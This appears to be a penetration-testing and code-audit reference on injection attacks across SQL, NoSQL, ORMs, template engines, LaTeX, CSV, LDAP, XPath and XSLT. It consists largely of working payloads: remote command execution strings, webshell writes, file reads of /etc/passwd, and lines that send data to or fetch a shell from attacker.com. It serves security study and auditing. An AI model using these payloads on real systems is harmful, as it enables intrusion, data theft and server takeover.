# Injection Attacks Reference

## SQL Injection

### Source Audit Targets
- Raw queries with string concatenation
- ORM bypass: raw query methods, native queries, DQL with concat
- LIKE injection with unescaped wildcards (`%`, `_`)
- ORDER BY injection from user-controlled sort params
- Second-order SQLi: data stored safely but interpolated into queries later
- Stacked queries where the driver allows it (MSSQL, PostgreSQL)
- Error-based, union-based, blind boolean, blind time-based, out-of-band vectors
- Database-specific tricks: MySQL `INTO OUTFILE`/`DUMPFILE`, MSSQL `xp_cmdshell`, PostgreSQL `COPY TO`/`lo_export`, SQLite `ATTACH DATABASE`
- JSON/XML column injection (PostgreSQL `jsonb`, MySQL `JSON_EXTRACT`)
- `HANDLER` statements for alternative data extraction (MySQL)
- Window functions for blind data exfiltration
- DNS exfiltration via `LOAD_FILE(CONCAT('\\\\',data,'.attacker.com\\a'))` (MySQL), `dblink` (PostgreSQL), `xp_dirtree` (MSSQL)
- WAF bypass: inline comments (`/*!50000*/`), case variation, encoding, scientific notation in numeric contexts, `CONCAT()`/`CHR()` to build strings, whitespace alternatives (`%09`, `%0a`, `%0c`, `%0d`, `%a0`, `/**/`)
- Truncation attacks: overlong data silently truncated by column width
- Bitwise extraction for blind SQLi: `AND (SELECT bit FROM ... LIMIT 1)&(1<<N)`

### ORM Injection Patterns
- **Laravel:** `whereRaw()`, `selectRaw()`, `orderByRaw()`, `havingRaw()`, `DB::raw()`
- **Doctrine:** `createQuery()` with string concat, `createNativeQuery()`
- **Hibernate:** HQL injection in `createQuery()`, criteria injection
- **SQLAlchemy:** `text()`, `from_statement()`, f-strings in query building
- **Sequelize:** `sequelize.query()`, `$literal`, operator injection via `$gt`, `$ne`
- **ActiveRecord:** `where("col = '#{params[:x]}'")`, `order()`, `pluck()`, `calculate()`

### SQLi Beyond Basics (Database-Specific)

**MySQL specific:** `GROUP_CONCAT()`, `LOAD_FILE()`, `INTO OUTFILE`/`DUMPFILE`, `@@version`, `information_schema` enumeration, `binary` keyword for case-sensitive comparison, `/*!50000 UNION*/` version-gated comments for WAF bypass, `HANDLER` for alternative table reads, `JSON_ARRAYAGG()`, `BENCHMARK()` for time-based blind, `SLEEP()`, `hex()/unhex()` for encoding

**PostgreSQL specific:** `COPY TO/FROM PROGRAM 'command'` (RCE!), `lo_import`/`lo_export`, `dblink` for OOB, `pg_read_file()`, `pg_ls_dir()`, `PL/pgSQL`/`PL/Python`/`PL/Perl` for code execution, `pg_sleep()`, `CHR()` for string building, `||` for concat, `RAISE NOTICE` for error-based extraction

**SQLite specific:** `ATTACH DATABASE '/var/www/shell.php' AS shell; CREATE TABLE shell.s(d text); INSERT INTO shell.s VALUES('<?php system($_GET["c"]);?>');`, `load_extension()` for RCE, `fts3_tokenizer()` for RCE, `SUBSTR()`, `UNICODE()`, `CHAR()` for string manipulation, `LIKE` for blind

**MSSQL specific:** `xp_cmdshell`, `sp_OACreate` + `sp_OAMethod`, `OPENROWSET`, stacked queries for chaining, `WAITFOR DELAY` for time-based blind, `xp_dirtree` for OOB DNS, `fn_xe_file_target_read_file`, linked servers for pivoting

### SQL Injection via Prepared Statement Edge Cases

**PDO emulated prepares (PHP):** When `PDO::ATTR_EMULATE_PREPARES` is `true` (default in many configs), PDO performs client-side escaping instead of true server-side prepared statements. Combined with charset mismatch (e.g., GBK encoding), `addslashes()` escaping can be bypassed with multibyte characters like `%bf%27`.

**Parameterized ORDER BY:** Most prepared statement APIs don't support parameterized column names in `ORDER BY`, `GROUP BY`, or table names — these must be whitelisted, not parameterized.

**IN clause expansion:** `WHERE id IN (?)` with array input — many drivers expand this unsafely. Libraries like `sqlstring` in Node.js or manual array joins create injection vectors.

**Stored procedure output:** Parameterized input to stored procedures that internally use dynamic SQL (`EXEC`, `sp_executesql` with concat) — injection happens inside the procedure.

---

## NoSQL Injection

- MongoDB operator injection: `{"$gt":""}`, `{"$ne":""}`, `{"$regex":".*"}` in query parameters
- MongoDB `$where` clause with JavaScript execution: `{"$where":"this.password.match(/^a/)"}`
- MongoDB aggregation pipeline injection via `$lookup`, `$merge`, `$out`
- JSON body parameter pollution: `{"username":"admin","password":{"$ne":""}}` bypassing auth
- CouchDB Mango query injection
- Redis command injection via protocol smuggling (CRLF in values)
- Redis Lua script injection (`EVAL` with tainted script)
- Firebase/Firestore rule bypass via crafted document paths
- Elasticsearch query DSL injection, Groovy/Painless script injection
- LDAP-style filter injection in MongoDB: `(|(user=*)(password=*))`
- Server-side JavaScript injection in MongoDB MapReduce
- Blind NoSQL extraction via regex: `{"password":{"$regex":"^a"}}` character by character
- GraphQL + NoSQL: nested filter bypass, batch query data extraction

### MongoDB Operator Injection Table

| Operator | Purpose | Payload Example |
|----------|---------|-----------------|
| `$ne` | Not equals | `username[$ne]=toto&password[$ne]=toto` |
| `$gt` / `$lt` | Greater/less than | `pass[$gt]=s` |
| `$regex` | Pattern match | `username[$regex]=^adm&password[$ne]=1` |
| `$exists` | Field existence | `username[$exists]=true` |
| `$nin` | Not in array | `username[$nin][admin]=admin` |
| `$where` | Server-side JS execution | `this.username == '${username}'` |
| `$lookup` | Cross-collection aggregation | Access other collections via regex on sensitive fields |

### Blind NoSQL Extraction
- **Length detection:** `password[$regex]=.{1}`, `.{3}`, etc. to discover field length
- **Character enumeration:** `password[$regex]=a.{2}`, `b.{2}` — character-by-character extraction
- **`$where` regex matching:** `/?search=admin' && this.password.match(/^duvj.*$/)%00`
- **Error-based exfiltration:** inject `throw new Error(JSON.stringify(this))` in `$where` clauses to leak documents via error messages

### Exotic NoSQL Sinks
- **Mongoose RCE (CVE-2024-53900 / CVE-2025-23061):** `populate().match` copied objects before MongoDB validation: `author[$where]=global.process.mainModule.require('child_process').execSync('id')`
- **Mongoose error-based extraction:** `{"$where":"throw new Error(JSON.stringify(this))"}` — leaks the entire document via error message
- **Rocket.Chat CVE-2023-28359:** unpatched Meteor method accepted `$where` operators on `listEmojiCustom`
- **Cross-collection data access** via `$lookup` aggregation pipelines with regex on sensitive fields

### ORM / REST API Operator Injection
- REST APIs that pass query params directly to ORM filter methods: `?filter[password][$ne]=x`, `?username[$exists]=true`
- Very common in Node.js (Mongoose, Sequelize) and PHP (Laravel Eloquent with array filters) when `req.query` is spread directly into a find/where call
- MongoDB operator injection: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` in JSON body — auth bypass without knowing credentials
- Sequelize operator injection via aliased operators: `{[Op.gt]: 0}` constructed from user input when `operatorsAliases` enabled (deprecated but present in legacy apps)

### ORM Smuggling

Framework-specific ORM behaviors that bypass authorization or validation logic:

| Framework | Technique | Impact |
|-----------|-----------|--------|
| **Beego ORM** | Filter-expression segment-overwrite: inject filter conditions via query parameter parsing that overwrite existing WHERE clauses | Auth bypass — attacker controls query predicates |
| **Prisma** | Type confusion in filter arguments: passing object where string expected bypasses type-level validation | Auth bypass — e.g., `where: {email: {contains: ""}}` returns all records |
| **Sequelize** | Operator aliasing (deprecated `$gt`, `$ne` operators): `operatorsAliases: true` allows query operator injection from user input | Data extraction, auth bypass |
| **Mongoose** | Buffer type confusion: passing `Buffer` where `String` expected in comparison operations | Comparison bypass |
| **TypeORM** | `Like()`, `Raw()` with string interpolation in `find()` options | SQLi through ORM |

**Key insight:** ORMs provide a false sense of security. Any ORM method that accepts complex objects from user input (nested filters, operators, raw expressions) can be smuggled past the ORM's query builder.

---

## SSTI (Server-Side Template Injection)

### Identification
Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `${{7*7}}` — response containing `49` confirms SSTI.

**Detection flow:** `${7*7}` → `a]{{7*7}}` → `{{7*7}}` → `<%= 7*7 %>` → `{7*7}` → identify engine → exploit

### Engine-Specific Audit Targets
- **Twig (PHP):** `{{['id']|filter('system')}}` (Twig 3), `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}` (older), `{{app.request.server.all|join(',')}}` for env dump
- **Smarty (PHP):** `{system('id')}`, `{php}system('id');{/php}` (if php tags enabled), `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}`
- **Jinja2 (Python):** MRO chain: `''.__class__.__mro__[1].__subclasses__()` → find `subprocess.Popen` or `os._wrap_close`, `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, `{{lipsum.__globals__.os.popen('id').read()}}`, `{{cycler.__init__.__globals__.os.popen('id').read()}}`
- **Mako (Python):** `${__import__('os').popen('id').read()}`, `<% import os; os.system('id') %>`
- **Tornado (Python):** `{% import os %}{{ os.popen('id').read() }}`
- **ERB (Ruby):** `<%= system('id') %>`, `` <%= `id` %> ``, `<%= IO.popen('id').read %>`
- **Slim (Ruby):** `#{ system('id') }`
- **Pebble (Java):** `{% set cmd = 'id' %}{% set runtime = beans.get('java.lang.Runtime') %}...`
- **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, `${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}`
- **Thymeleaf (Java):** `__${T(java.lang.Runtime).getRuntime().exec('id')}__::`, Spring View name manipulation
- **Velocity (Java):** `#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))...`
- **EL/OGNL/SpEL (Java):** `${Runtime.getRuntime().exec('id')}`, `${T(java.lang.Runtime).getRuntime().exec('id')}`
- **Handlebars (Node.js):** prototype pollution + `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...` lookup gadget
- **Pug/Jade (Node.js):** `-var x = global.process.mainModule.require('child_process').execSync('id')`
- **Nunjucks (Node.js):** `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`
- **EJS (Node.js):** delimiter injection, `<%= global.process.mainModule.require('child_process').execSync('id') %>`
- **Sandbox escapes:** using `__builtins__`, `__globals__`, `__subclasses__()`, `__mro__`, `__init__`, `__import__`, `lipsum`, `cycler`, `joiner`, `namespace` objects as gadgets to reach dangerous functions

### SSTI Payloads Quick Reference

**Twig:** `{{['id']|filter('system')}}` (Twig 3), `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}` (older)

**Smarty:** `{system('id')}`, `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}`

**Jinja2:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, `{{lipsum.__globals__.os.popen('id').read()}}`, MRO chain from `''.__class__.__mro__[1].__subclasses__()`

**Mako:** `${__import__('os').popen('id').read()}`

**ERB:** `<%= system('id') %>`, `` <%= `id` %> ``

**Freemarker:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

**Thymeleaf:** `__${T(java.lang.Runtime).getRuntime().exec('id')}__::`

**Velocity:** `#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')`

**Pebble:** `{% set cmd = 'id' %}...`

**Nunjucks:** `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`

**EJS:** `<%= global.process.mainModule.require('child_process').execSync('id') %>`

**Handlebars + Prototype Pollution:** pollute `__proto__.type` or `__proto__.body` to inject template code

### Advanced SSTI Chains

**Jinja2 — Blind RCE without offset guessing:**
`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}`

**Jinja2 — Evil config file chain (3-step):**
1. Write config: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
2. Load config: `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
3. Execute: `{{ config['RUNCMD']('/bin/bash -c "..."',shell=True) }}`

**Jinja2 — Filter bypass via hex escapes:** `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')...}}`

**Jinja2 — Filter bypass via request.args:** `{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_`

**Jinja2 — Alternative global objects for RCE:** `cycler`, `joiner`, `namespace`, `lipsum` — all expose `__globals__.os.popen()`

**Twig — Callback-based RCE (Twig 3):**
- `{{['id']|filter('system')}}`, `{{[0]|reduce('system','id')}}`, `{{['id']|map('system')|join}}`
- `{{['id',1]|sort('system')|join}}`, `{{{'id':'shell_exec'}|map('call_user_func')|join}}`

**Twig — Sandbox bypass (CVE-2022-23614):**
`{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%}`

**Mako — 40+ chain variants via module traversal:**
`${self.module.cache.util.os.system("id")}`, `${self.module.runtime.util.os.system("id")}`, `${self.module.cache.compat.inspect.os.system("id")}`, `${self.module.filters.compat.inspect.os.system("id")}`

**Django — Information disclosure:**
- `{{ messages.storages.0.signer.key }}` (leaks SECRET_KEY)
- `{% debug %}` (dumps context), `{% load log %}{% get_admin_log 10 as log %}`

**Freemarker — Sandbox bypass via obfuscation:** `${(6?lower_abc+18?lower_abc+...)}` using numeric-to-letter conversion

**Groovy — AST sandbox bypass:** `@ASTTest` annotation for AST manipulation, `${"calc.exe".execute()}`

**Pebble — Reflection chain (v3.0.9+):** `(1).TYPE.forName('java.lang.Runtime')` reflective access

**Handlebars (JS) — Constructor chain RCE:** multi-nested `{{#with}}` blocks using `string.sub.apply` to build `require('child_process').execSync()` (< 4.1.2, < 4.0.14, < 3.0.7)

**Lodash (JS) — spawn_sync gadget:**
`{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{process.binding("spawn_sync").spawn(a).output}}`

**Smarty — writeFile gadget:** `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}`

**Elixir EEx — System.shell:** `<%= elem(System.shell("id"), 0) %>`

---

## LaTeX Injection

- **File read:** `\input{/etc/passwd}`, `\include{/etc/passwd}`
- **Command execution:** `\immediate\write18{id > /tmp/o}` — requires `--shell-escape` flag; common in online compilers (Overleaf, academic platforms)
- **Catcode bypass:** `\catcode\`\@=11` then `\@input{/etc/passwd}` — redefines `@` as a letter to access internal macros
- **File write to webshell:**
  ```
  \newwrite\f
  \openout\f=/tmp/x.php
  \write\f{<?php system($_GET["c"])?>}
  \closeout\f
  ```
- **Targets:** academic platforms (homework/thesis submission), invoice generators, report builders, CV generators, any app that renders user-supplied LaTeX to PDF

---

## CSV Injection

- **DDE formula injection:** `=cmd|'/C calc'!A0`, `=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!A1`
- **Data exfiltration:** `=HYPERLINK("http://attacker.com/?d="&A1,"Click")` — leaks adjacent cell content when victim clicks
- **Trigger prefixes:** `=`, `+`, `-`, `@`, `|` — also `%0A` / `%0D` (newline injection to escape cells and inject new rows)
- **Impact:** arbitrary command execution on the victim's machine when they open an exported CSV in Excel/LibreOffice; data exfiltration via hyperlink callback
- **Targets:** any feature that exports user-controlled data to CSV (reports, audit logs, order exports, user lists)
- **Mitigation check:** look for prefix stripping of `= + - @ |` before writing to CSV cells

---

## CRLF Injection / HTTP Header Injection

- Inject `\r\n` (`%0d%0a`) in user-controlled values reflected in HTTP headers
- **Response splitting:** inject full HTTP response including body → XSS, cache poisoning
- **Header injection:** inject `Set-Cookie`, `Location`, `X-Forwarded-For`, `Host` headers
- **Log injection:** CRLF in log entries to forge log lines, inject false audit trails
- **Email header injection:** `\r\nBcc: attacker@evil.com` in contact forms, password reset
- **Sinks:** `header()` in PHP, `res.setHeader()`/`res.redirect()` in Node.js, `HttpServletResponse.setHeader()` in Java, `redirect_to` in Rails
- **Common vectors:** redirect URLs, `Set-Cookie` values, `Location` header from user input, `Content-Disposition` filename
- **Double-encoding bypass:** `%250d%250a` when server double-decodes

---

## LDAP Injection

- **Authentication bypass:** `*)(uid=*))(|(uid=*` or `admin)(&)` in login fields
- **Search filter injection:** `(|(cn=*)(userPassword=*))` to extract all passwords
- **Blind extraction:** `(userPassword=a*)` → iterate characters based on response differences
- **Sinks:** `ldap_search()`, `ldap_bind()` in PHP; `DirContext.search()` in Java; `python-ldap` `search_s()`
- **DN injection:** semicolons, commas, special chars in Distinguished Names
- **Attribute injection:** inject additional attributes in LDAP modify operations

---

## XPath Injection

- **Authentication bypass:** `' or '1'='1` in XPath login queries `//user[username/text()='INPUT' and password/text()='INPUT']`
- **Data extraction:** `' or 1=1 or ''='` to return all nodes
- **Blind extraction:** `substring(//user[1]/password,1,1)='a'` character by character
- **Out-of-band:** `doc('http://attacker.com/?'+//user[1]/password)` (XPath 2.0+)
- **XPath in XML databases:** eXist-db, BaseX, MarkLogic query injection

---

## XSLT Injection

### XXE via XSLT Stylesheet
`<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>` embedded in `<xsl:stylesheet>` with `&ext_file;` reference

### `document()` Function (File Read / SSRF)
- `<xsl:copy-of select="document('file:///etc/passwd')"/>`
- `<xsl:copy-of select="document('http://internal-service:8080/')"/>` (SSRF)

### EXSLT File Writing
`<exploit:document href="evil.txt" method="text">` — arbitrary file creation on server (EXSLT-enabled processors)

### PHP Function Execution via XSLT
- **RCE via assert:** `select="php:function('assert', $payload)"` where payload is `include("http://attacker.com/shell.php")`
- **Webshell:** `select="php:function('file_put_contents','/var/www/shell.php','<?php system($_GET[\"cmd\"]); ?>')"`
- **File read:** `select="php:function('readfile','/etc/passwd')"`
- **Directory listing:** `select="php:function('scandir','/')"`

### Java Runtime Execution (Xalan)
Namespace `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` then `select="rt:exec($rtobject,'id')"` — full RCE

### Saxon XSLT 2.0 Execution
`xmlns:Runtime="java:java.lang.Runtime"` — direct Java type invocation for command execution

### .NET Native Code Execution
`<msxsl:script>` with embedded C# calling `System.Diagnostics.Process.Start()` — complete system compromise
